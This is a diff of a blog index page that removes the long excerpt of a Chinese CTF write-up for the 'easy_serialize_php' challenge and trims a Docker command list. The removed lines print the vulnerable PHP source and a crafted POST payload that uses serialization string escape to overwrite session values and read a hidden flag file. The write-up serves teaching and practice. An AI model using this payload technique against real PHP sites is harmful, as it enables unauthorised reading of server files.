@@ -154,7 +154,7 @@
                 <span class="icon">
                     <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
                 </span>
-                -web
+                web
             </a>
         </span>
         
@@ -168,163 +168,7 @@
     <div class="excerpt">
         <div class="content" v-pre>
             
-            <h1>easy_serialize_php</h1>
-<blockquote>
-<p>文笔垃圾，内容肤浅，毫无营养。</p>
-<p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></p>
-</blockquote>
-<p>打开题目会有source_code，点击会将页面源码打印出来：</p>
-<pre><code class="language-php">&lt;?php
-
-$function = @$_GET['f'];
-
-function filter($img)&#123;
-    $filter_arr = array('php','flag','php5','php4','fl1g');
-    $filter = '/'.implode('|',$filter_arr).'/i';
-    return preg_replace($filter,'',$img);
-&#125;
-
-
-if($_SESSION)&#123;
-    unset($_SESSION);
-&#125;
-
-$_SESSION[&quot;user&quot;] = 'guest';
-$_SESSION['function'] = $function; //此处的function 由f传来的参数赋值
-
-extract($_POST);
-
-if(!$function)&#123;
-    echo '&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';
-&#125;
-
-if(!$_GET['img_path'])&#123;
-    $_SESSION['img'] = base64_encode('guest_img.png');
-&#125;else&#123;
-    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
-&#125;
-
-$serialize_info = filter(serialize($_SESSION));
-
-if($function == 'highlight_file')&#123;
-    highlight_file('index.php');
-&#125;else if($function == 'phpinfo')&#123;
-    eval('phpinfo();'); //maybe you can find something in here!
-&#125;else if($function == 'show_image')&#123;
-    $userinfo = unserialize($serialize_info);
-    echo file_get_contents(base64_decode($userinfo['img']));
-&#125;
-</code></pre>
-<h2 id="0-0-解释函数">0.0 解释函数</h2>
-<p>extract()   php函数，作用是将数组键名作为变量名，使用数组键值作为变量值，返回值成功设置的变量数目。简单来说就是可以覆盖或者创建变量。</p>
-<p>serialize()  php函数，作用是将数组或者对象转化成字符串，返回值为字符串，便于传递。</p>
-<p>implode()  php函数，作用是将数组中的元素中间添加字符组成新的字符串，返回值是新的字符串。</p>
-<h2 id="0-1分析源码">0.1分析源码</h2>
-<p>看到38行的<strong>unserialize</strong>函数和39行的<strong>file_get_contents</strong>函数，大概可以锁定这道题目是通过反序列化读取文件。而反序列化的内容是**$serialize_info**，向上找一下$serialize_info是个什么，分析如下</p>
-<pre><code class="language-php">$serialize_info = filter(serialize($_SESSION)); //可以看到serialize_info是序列化了$_SESSION这个超全局变量,然后对序列化的内容进行了过滤
-//filter的定义如下
-function filter($img)&#123;
-    $filter_arr = array('php','flag','php5','php4','fl1g');
-    $filter = '/'.implode('|',$filter_arr).'/i';
-    return preg_replace($filter,'',$img);
-&#125;
-//大概意思是将php、flag、php5、php4、fl1g(不区分大小写，意思就是你大写也会被替换为空)替换为空
-</code></pre>
-<p>看到这里，很多有经验的师傅已经知道，这里存在php反序列化字符串逃逸漏洞，我们还需要知道我们可以输入的点在哪里，再往上找，看到<strong>extract($_POST);</strong>，这行代码可以覆盖变量，或者添加变量，我们可以向$_SESSION数组中添加键值对，或者修改键值对。</p>
-<p>**file_get_contents(base64_decode($userinfo[‘img’]))**这里很明显是输出$userinfo[‘img’]里面所指的文件。上面已经分析$userinfo[‘img’]是序列化$_SESSION得来的，所以我们需要逃逸的key:value已经很明确了，就是img:base64-encode(flag的地址)。</p>
-<p>但是flag在哪呢？访问flag.php不存在，再看源码中有一个phpinfo，访问/index.php?f=phpinfo</p>
-<p><img src="https://s2.loli.net/2022/10/25/nBtKTNbR7D5M63e.png" alt="image-20221025170636932.png"></p>
-<h2 id="0-2-php反序列化逃逸">0.2 php反序列化逃逸</h2>
-<p>这里是将关键字替换为空，举一个例子，假设</p>
-<pre><code class="language-php">&lt;?php
-
-$user_info = array(
-	&quot;username&quot;=&gt;$_POST['username'],
-	&quot;password&quot;=&gt;$_POST['password']
-);
-
-echo serialize($user_info);
-?&gt;
-</code></pre>
-<p>输出结果为</p>
-<pre><code class="language-php">a:2:&#123;s:8:&quot;username&quot;;s:23:&quot;admin1admin1admin1admin&quot;;s:8:&quot;password&quot;;s:26:&quot;&quot;;s:8:password;s:3:&quot;123&quot;;&#125;&quot;;&#125;
-</code></pre>
-<p>假如我有一个替换函数，是将admin1和admin替换为空，那么返回的字符串为</p>
-<pre><code class="language-php">a:2:&#123;s:8:&quot;username&quot;;s:23:&quot;&quot;;s:8:&quot;password&quot;;s:26:&quot;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&quot;;&#125;
-//&quot;;s:8:&quot;password&quot;;s:26:&quot; 这段字符串长度为23，反序列化时，会被认为是username的值，而逃逸出后面的字符
-</code></pre>
-<p>我们将这段代码反序列化一下：</p>
-<pre><code class="language-php">&lt;?php
-$info ='a:2:&#123;s:8:&quot;username&quot;;s:23:&quot;&quot;;s:8:&quot;password&quot;;s:26:&quot;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&quot;;&#125;';     
-$user = unserialize($info);
-echo $user['password'];
-?&gt;
-</code></pre>
-<p><img src="https://s2.loli.net/2022/10/25/U2im6wSjfRnx8yQ.png" alt="image-20221025173047311.png"></p>
-<h2 id="0-3-构造payload">0.3 构造payload</h2>
-<p>可以在本地搭建一个php环境，输出一下正常序列化内容，然后我们再根据需要修改：</p>
-<pre><code class="language-php">&lt;?php
-
-$function = @$_GET['f'];
-
-function filter($img)&#123;
-    $filter_arr = array('php','flag','php5','php4','fl1g');
-    $filter = '/'.implode('|',$filter_arr).'/i';
-    return preg_replace($filter,'',$img);
-&#125;
-
-
-if($_SESSION)&#123;
-    unset($_SESSION);
-&#125;
-
-$_SESSION[&quot;user&quot;] = 'guest';
-$_SESSION['function'] = $function;
-
-extract($_POST);
-
-if(!$function)&#123;
-    echo '&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;';
-&#125;
-
-if(!$_GET['img_path'])&#123;
-    $_SESSION['img'] = base64_encode('guest_img.png');
-&#125;else&#123;
-    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
-&#125;
-
-$serialize_info = filter(serialize($_SESSION));
-//添加下面一行代码
-echo $serialize_info;
-
-if($function == 'highlight_file')&#123;
-    highlight_file('index.php');
-&#125;else if($function == 'phpinfo')&#123;
-    echo &quot;flag in flag.php!&quot;;
-&#125;else if($function == 'show_image')&#123;
-    $userinfo = unserialize($serialize_info);
-    echo file_get_contents(base64_decode($userinfo['img']));
-&#125;
-
-//a:3:&#123;s:4:&quot;name&quot;;s:16:&quot;flagflagphpphpphp&quot;;s:1:&quot;a&quot;;s:50:&quot;b&quot;;s:3:&quot;img&quot;;s:12:&quot;ZmxhZy5waHA=&quot;;s:1:&quot;q&quot;;s:1:&quot;w&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;
-//admin1admin1admin1admin
-//&quot;;s:8:&quot;password&quot;;s:26:&quot;
-
-</code></pre>
-<p>我们提交一个?f=highlight_file</p>
-<p><img src="https://s2.loli.net/2022/10/25/9zXFuAgr6P82hMW.png" alt="image-20221025174410587.png"></p>
-<pre><code class="language-php">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:14:&quot;highlight_file&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;
-</code></pre>
-<p>在这里user的值我们内容可控，我们需要将  “;s:8:“function”;s:14:” 这个值赋给user，一共23个字符，所以构造user=flagflagphpphpphpphpphp</p>
-<p>以为读取文件时进行了base64解码，所以我们要将d0g3_f1ag.php进行 base64编码：ZDBnM19mMWFnLnBocA==</p>
-<p>访问index.php?f=show_image，然后构造post数据为：</p>
-<p>_SESSION[user]=flagflagphpphpphpphpphp&amp;_SESSION[function]=&quot;;s:3:“img”;s:20:“ZDBnM19mMWFnLnBocA==”;s:1:“b”;s:1:“a”;}</p>
-<p>s:1:“b”;s:1:“a”; 添加这个数据是因为a:3:{}表示这个数组里有三个键值对，我们在闭合前必须保证数据内的键值对数目等于3，所以添加一组，这样数组里有键值：user，img，b</p>
-<p>s表示字符串，1表示字符长度为1，“b” 为字符内容</p>
-<p><img src="https://s2.loli.net/2022/10/25/3cpYmuwto7ygXJh.png" alt="image-20221025175423175.png"></p>
-<p>然后继续构造：</p>
-<p>_SESSION[user]=flagflagphpphpphpphpphp&amp;_SESSION[function]=&quot;;s:3:“img”;s:20:“L2QwZzNfZmxsbGxsbGFn”;s:1:“b”;s:1:“a”;}</p>
-<p><img src="https://s2.loli.net/2022/10/25/9atfRgDUVlXBhkM.png" alt="image-20221025175957610.png"></p>
+            <p>这是一篇ctf题目的记录</p>
 
             
         </div>
@@ -338,8 +182,15 @@ if($function == 'highlight_file')&#123;
         
         <span class="tag">
             
-            <a href="/tags/ctf/" style="color: #00bcd4">
-                -ctf
+            <a href="/tags/ctf/" style="color: #ffa2c4">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/web/" style="color: #00bcd4">
+                web
             </a>
         </span>
         
@@ -364,74 +215,14 @@ if($function == 'highlight_file')&#123;
         <div class="content" v-pre>
             
             <h1>docker的常用命令</h1>
+<blockquote>
+<p>文笔垃圾，内容肤浅，毫无营养。</p>
+</blockquote>
 <h2 id="帮助命令">帮助命令</h2>
 <p><strong>docker version   #显示docker的版本信息</strong></p>
 <p><strong>docker info   #显示docker的系统信息，包括镜像和容器的数量</strong></p>
 <p>docker 命令 --help  #万能命令</p>
 <p>帮助文档地址：<a target="_blank" rel="noopener" href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p>
-<h2 id="镜像命令">镜像命令</h2>
-<ol>
-<li><strong>docker images #查看本地所有主机上的镜像</strong></li>
-</ol>
-<p>-a, --all    #显示所有镜像</p>
-<p>-q, --quiet   #只显示镜像id</p>
-<ol start="2">
-<li><strong>docker search 搜索镜像</strong></li>
-</ol>
-<pre><code class="language-shell">sudo docker search mysql
-NAME                            DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED
-mysql                           MySQL is a widely used, open-source relation…   13234     [OK]
-mariadb                         MariaDB Server is a high performing open sou…   5062      [OK]
-phpmyadmin                      phpMyAdmin - A web interface for MySQL and M…   640       [OK]
-percona                         Percona Server is a fork of the MySQL relati…   588       [OK]
-bitnami/mysql                   Bitnami MySQL Docker Image                      77                   [OK]
-</code></pre>
-<p>–filter=STARS=3000   #搜索出来的镜像就是STARS大于3000的</p>
-<ol start="3">
-<li><strong>docker pull 下载镜像</strong></li>
-</ol>
-<p>#下载镜像 docker pull 镜像名[:tag]（tag是对应版本）</p>
-<p>docker pull mysql  #如果不写tag，默认是latest（最新版）</p>
-<ol start="4">
-<li><strong>docker rmi #删除镜像</strong></li>
-</ol>
-<p>docker rmi -f 镜像id</p>
-<p>docker rmi -f $(docker images -aq)   #利用linux命令，此时会将所有镜像递归删除</p>
-<h2 id="容器命令">容器命令</h2>
-<p>说明：我们有了镜像才可以创建容器。linux，下载一个centos镜像来测试学习</p>
-<p><strong>docker pull centos</strong>    #安装最新版的centos</p>
-<p><strong>新建容器并启动</strong></p>
-<p>docker run [可选参数] image</p>
-<pre><code class="language-shell">#参数说明
---name=&quot;Name&quot;   #容器名字 tomcat01 tomcat02  用来区分容器
--d    #后台方式运行
--it   #使用交互方式运行，进入容器查看内容
--p    #指定容器的端口 -p 8080：8080
-	-p ip:主机端口:容器端口
-	-p 主机端口:容器端口
-	-p 容器端口
--P    #随机指定端口
-</code></pre>
-<p><strong>docker run -it centos /bin/bash</strong>   #启动并进入容器</p>
-<p>exit    #从容器中退回去主机中</p>
-<ol>
-<li><strong>docker ps   #列出所有运行中的容器</strong></li>
-</ol>
-<p>-a   #查看运行中的容器+运行过的容器</p>
-<p>-q   #只显示容器的id</p>
-<ol start="2">
-<li><strong>docker rm 容器id    #删除指定的容器</strong></li>
-</ol>
-<p>docker rm -f $(docker ps -aq)   #删除指定的容器</p>
-<p>docker ps -a -q|xargs docker rm   #删除所有的容器</p>
-<ol start="3">
-<li>docker 启动暂停容器</li>
-</ol>
-<p>docker start 容器id   #开始容器</p>
-<p>docker stop 容器id  #停止容器</p>
-<p>docker restart 容器id   #重启容器</p>
-<p>docker kill 容器id   #暴力停止容器</p>
-
             
         </div>
     </div>
@@ -444,7 +235,7 @@ bitnami/mysql                   Bitnami MySQL Docker Image                      
         
         <span class="tag">
             
-            <a href="/tags/tools/" style="color: #03a9f4">
+            <a href="/tags/tools/" style="color: #00bcd4">
                 -tools
             </a>
         </span>
